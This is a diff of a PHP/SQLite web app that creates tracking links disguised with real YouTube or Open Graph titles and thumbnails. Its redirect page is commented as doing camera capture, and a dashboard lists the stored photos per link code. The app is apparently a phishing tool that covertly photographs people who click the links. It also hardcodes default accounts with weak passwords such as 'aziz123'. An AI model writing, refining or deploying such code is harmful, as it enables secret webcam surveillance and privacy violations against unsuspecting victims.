@@ -2,6 +2,7 @@
 date_default_timezone_set('Africa/Algiers');
 session_start();
 
+// إعدادات الأخطاء لتجنب تداخل المخرجات
 ini_set('display_errors', 0);
 error_reporting(0);
 
@@ -9,7 +10,7 @@ try {
     $db = new PDO('sqlite:tracker_pro.db');
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // جدول المستخدمين مع إضافة حقل الصلاحية (role)
+    // إنشاء الجداول الأساسية
     $db->exec("CREATE TABLE IF NOT EXISTS users (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         username TEXT UNIQUE,
@@ -17,7 +18,6 @@ try {
         role TEXT DEFAULT 'user'
     )");
 
-    // جدول الروابط
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         user_id INTEGER,
@@ -28,7 +28,6 @@ try {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
-    // جدول الصور الملتقطة
     $db->exec("CREATE TABLE IF NOT EXISTS captures (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         user_id INTEGER,
@@ -37,7 +36,7 @@ try {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
-    // البروفات الـ 5 (وجعل aziz هو المدير 'admin')
+    // إدخال الحسابات الافتراضية
     $default_users = [
         ['aziz', 'aziz123', 'admin'],
         ['salah', 'salah123', 'user'],
@@ -50,17 +49,17 @@ try {
         $stmt = $db->prepare("SELECT id FROM users WHERE username = ?");
         $stmt->execute([$u[0]]);
         if (!$stmt->fetch()) {
-            $insertUser = $db->prepare("INSERT INTO users (username, password, role) VALUES (?, ?, ?)");
-            $insertUser->execute([$u[0], password_hash($u[1], PASSWORD_DEFAULT), $u[2]]);
+            $hashed_pass = password_hash($u[1], PASSWORD_DEFAULT);
+            $insert = $db->prepare("INSERT INTO users (username, password, role) VALUES (?, ?, ?)");
+            $insert->execute([$u[0], $hashed_pass, $u[2]]);
         }
     }
-
 } catch (Exception $e) {
-    die("Database Error");
+    die("Database Connection Error");
 }
 
 // معالجة تسجيل الدخول
-if (isset($_POST['login_username']) && isset($_POST['login_password'])) {
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_username'], $_POST['login_password'])) {
     $username = trim($_POST['login_username']);
     $password = $_POST['login_password'];
 
@@ -80,13 +79,14 @@ if (isset($_POST['login_username']) && isset($_POST['login_password'])) {
     }
 }
 
+// تسجيل الخروج
 if (isset($_GET['logout'])) {
     session_destroy();
     header("Location: " . $_SERVER['PHP_SELF']);
     exit();
 }
 
-// معالجة طلبات الحذف
+// معالجة عمليات الحذف
 if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER['REQUEST_METHOD'] === 'POST') {
     $current_user_id = $_SESSION['user_id'];
     $is_admin = ($_SESSION['role'] === 'admin');
@@ -128,12 +128,12 @@ if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && 
     }
 }
 
-// دالة محسنة لسحب العنوان والصورة الحقيقيين (من يوتيوب أو أي موقع عبر Open Graph)
+// دالة جلب العنوان والصورة الحقيقيين
 function fetch_real_meta($url) {
     $title = "Secure Redirect";
     $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
-    // التحقق إذا كان الرابط يوتيوب
+    // فحص يوتيوب
     if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url, $matches)) {
         $video_id = $matches[1];
         $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
@@ -155,7 +155,7 @@ function fetch_real_meta($url) {
         return ['title' => trim($title), 'image' => trim($image)];
     }
 
-    // سحب البيانات للمواقع العادية عبر cURL وسوم Open Graph
+    // جلب المواقع العادية عبر cURL
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -166,19 +166,16 @@ function fetch_real_meta($url) {
     curl_close($ch);
 
     if ($html) {
-        // استخراج العنوان og:title أو title العادي
         if (preg_match('/<meta[^>]*property=["\']og:title["\'][^>]*content=["\']([^"\']+)["\']/i', $html, $m) ||
             preg_match('/<title>(.*?)<\/title>/si', $html, $m)) {
             $title = html_entity_decode(trim($m[1]));
         }
 
-        // استخراج الصورة og:image
         if (preg_match('/<meta[^>]*property=["\']og:image["\'][^>]*content=["\']([^"\']+)["\']/i', $html, $m)) {
             $image = trim($m[1]);
-            // معالجة الروابط النسبية إن وجدت
             if (strpos($image, 'http') !== 0) {
                 $parsed = parse_url($url);
-                $image = $parsed['scheme'] . '://' . $parsed['host'] . $image;
+                $image = ($parsed['scheme'] ?? 'https') . '://' . ($parsed['host'] ?? '') . $image;
             }
         }
     }
@@ -186,10 +183,7 @@ function fetch_real_meta($url) {
     return ['title' => trim($title), 'image' => trim($image)];
 }
 
-$og_title = "Secure Redirect";
-$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
-$target_redirect = "";
-
+// معالجة التوجيه وزيارة الرابط
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
     $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
@@ -217,9 +211,9 @@ if (isset($_GET['r'])) {
     }
 }
 
+// إنشاء رابط جديد
 $generated_link = "";
-$tracking_code = "";
-if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
+if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
     if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
         $target_url = "https://" . $target_url;
@@ -231,18 +225,18 @@ if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && 
     $stmt = $db->prepare("INSERT INTO links (user_id, code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?, ?)");
     $stmt->execute([$_SESSION['user_id'], $code, $target_url, $meta['title'], $meta['image']]);
 
-    $tracking_code = $code;
     $domain = $_SERVER['HTTP_HOST'];
     $generated_link = "https://" . $domain . "/?r=" . $code;
 }
 
+// جلب التقاطات الصور حسب الصلاحية
+$captures = [];
 if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
     $current_user_id = $_SESSION['user_id'];
     $is_admin = ($_SESSION['role'] === 'admin');
     $filter_code = trim($_GET['track'] ?? '');
 
     if ($is_admin) {
-        // المدير (aziz) يمكنه رؤية كل التقاطات المستخدمين أو الفلترة بالكود
         if (!empty($filter_code)) {
             $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
             $stmt->execute([$filter_code]);
@@ -250,7 +244,6 @@ if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
             $stmt = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 50");
         }
     } else {
-        // المستخدم العادي يرى التقاطاته فقط
         if (!empty($filter_code)) {
             $stmt = $db->prepare("SELECT * FROM captures WHERE user_id = ? AND code = ? ORDER BY id DESC");
             $stmt->execute([$current_user_id, $filter_code]);
@@ -262,6 +255,7 @@ if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
     $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
 }
 
+// عرض صفحة التوجيه والتقاط الكاميرا
 if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
@@ -351,25 +345,20 @@ endif;
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
         body { background-color: var(--bg); color: var(--text); padding: 30px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
         .container { max-width: 1200px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
-        
         .panel { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 24px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.3); }
         h2 { font-size: 13px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); margin-bottom: 16px; border-bottom: 1px solid var(--border); padding-bottom: 8px; }
-
         .form-control { display: flex; gap: 10px; }
         input[type="text"], input[type="password"] { flex: 1; background: #020617; border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; color: var(--text); font-size: 14px; outline: none; transition: border 0.2s; }
         input[type="text"]:focus, input[type="password"]:focus { border-color: var(--accent); }
-        
         .btn { background: var(--accent); color: white; border: none; padding: 0 20px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; text-decoration: none; transition: background 0.2s; }
         .btn:hover { background: var(--accent-hover); }
         .btn-danger { background: var(--danger); color: white; }
         .btn-danger:hover { background: var(--danger-hover); }
         .btn-secondary { background: #334155; }
         .btn-secondary:hover { background: #475569; }
-        
         .output-box { background: #020617; border: 1px solid var(--border); padding: 16px; border-radius: 8px; margin-top: 15px; }
         .output-box label { display: block; font-size: 10px; text-transform: uppercase; color: var(--muted); margin-bottom: 6px; }
         .flex-row { display: flex; gap: 8px; }
-
         .gallery-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
         .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 16px; margin-top: 15px; }
         .item-card { background: #020617; border: 1px solid var(--border); border-radius: 8px; padding: 10px; text-align: center; display: flex; flex-direction: column; justify-content: space-between; }
@@ -378,13 +367,10 @@ endif;
         .code-tag { color: var(--accent); font-family: monospace; font-weight: bold; }
         .btn-delete-single { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid var(--danger); padding: 6px 10px; border-radius: 6px; font-size: 11px; cursor: pointer; margin-top: 10px; width: 100%; transition: all 0.2s; font-weight: 600; }
         .btn-delete-single:hover { background: var(--danger); color: white; }
-
         .login-wrapper { display: flex; justify-content: center; align-items: center; height: 80vh; }
         .login-card { max-width: 400px; width: 100%; text-align: center; }
         .error-msg { color: var(--danger); font-size: 12px; margin-bottom: 12px; }
-
         .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-
         footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--muted); border-top: 1px solid var(--border); padding-top: 20px; }
         footer span { color: var(--accent); font-weight: 600; }
     </style>
@@ -443,14 +429,14 @@ endif;
                     <?php if (!empty($captures)): ?>
                         <form method="POST" onsubmit="return confirm('هل أنت متأكد من رغبتك في حذف جميع الصور المعروضة؟');">
                             <input type="hidden" name="delete_all" value="1">
-                            <input type="hidden" name="track_code" value="<?php echo htmlspecialchars($filter_code); ?>">
+                            <input type="hidden" name="track_code" value="<?php echo htmlspecialchars($filter_code ?? ''); ?>">
                             <button type="submit" class="btn btn-danger" style="height: 36px; font-size: 12px; padding: 0 14px;">حذف الكل</button>
                         </form>
                     <?php endif; ?>
                 </div>
 
                 <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
-                    <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>">
+                    <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code ?? ''); ?>">
                     <button type="submit" class="btn">Filter</button>
                     <?php if(!empty($filter_code)): ?>
                         <a href="/" class="btn btn-secondary" style="text-decoration:none; display:flex; align-items:center;">Reset</a>
@@ -464,8 +450,8 @@ endif;
                         <?php foreach ($captures as $cap): ?>
                             <div class="item-card">
                                 <div>
-                                    <a href="<?php echo $cap['image_data']; ?>" target="_blank">
-                                        <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
+                                    <a href="<?php echo htmlspecialchars($cap['image_data']); ?>" target="_blank">
+                                        <img src="<?php echo htmlspecialchars($cap['image_data']); ?>" alt="Capture">
                                     </a>
                                     <div class="meta-info">
                                         <span class="code-tag"><?php echo htmlspecialchars($cap['code']); ?></span>
